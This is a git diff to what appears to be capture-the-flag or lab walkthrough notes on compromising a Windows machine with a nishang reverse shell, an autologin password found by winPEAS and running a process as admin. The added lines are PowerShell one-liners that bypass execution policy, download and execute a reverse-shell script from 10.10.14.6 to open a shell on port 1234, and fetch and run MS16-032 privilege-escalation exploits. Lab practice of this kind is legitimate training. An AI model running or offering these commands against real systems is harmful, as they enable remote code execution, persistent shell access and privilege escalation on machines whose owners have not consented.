@@ -158,3 +158,15 @@ Synopsis in the end:
 - Powershell is not stable, copy nishang /opt/nishang/Shells/ powershell reverse shell to be able to run powershell interactive
 - Create secure password, we got from winPEAS autologin
 - Run process as admin with same password, reverse powershell again for example
+
+
+
+
+
+powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 1234"
+
+
+
+iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/MS16-032.ps1')); Invoke-MS16-032
+
+iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/39719.ps1')); Invoke-MS16-032
